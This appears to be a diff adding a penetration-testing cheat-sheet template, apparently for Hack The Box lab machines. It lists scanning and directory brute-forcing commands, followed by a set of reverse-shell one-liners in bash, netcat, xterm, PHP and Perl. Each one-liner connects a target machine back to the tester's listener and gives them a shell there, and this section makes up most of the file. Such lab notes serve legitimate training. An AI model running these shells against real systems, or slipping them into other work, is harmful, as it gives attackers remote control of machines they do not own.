@@ -1,0 +1,35 @@
+# nmap quick 
+sudo nmap -sS -sV -Pn -oA quick %%BOX_IPAD%%
+
+# nmap full scan
+
+
+# get ssl cert
+echo | openssl s_client -servername %%BOX_NAME%%.htb -connect %%BOX_NAME%%.htb:443 2>/dev/null | openssl x509 -text
+
+# gobuster dir->directory bruteforce mode, -k -> skip ssl cert validation, -f -> append slash to each requets
+# -t -> threads -u -> url, -x -> extentions php,txt  -s status codes -b black listed status codes -a useragent
+gobuster dir -k -f -w /usr/share/wordlists/dirb/big.txt -s 307,200,204,301,302,403  -t 50 -u http://%%BOX_NAME%%.htb
+
+
+# reverse shells
+# first run nc on local box
+nc -lvnp 1234
+
+# then run one of these on remote box
+
+# bash
+bash -i >& /dev/tcp/%%LOCAL_IP%%/1234 0>&1
+
+# netcat
+nc -e /bin/sh %%LOCAL_IP%% 1234
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %%LOCAL_IP%% 1234 >/tmp/f
+
+# xterm
+xterm -display %%LOCAL_IP%%:1
+
+# php
+php -r '$sock=fsockopen("%%LOCAL_IP%%",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# perl
+perl -e 'use Socket;$i="%%LOCAL_IP%%";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
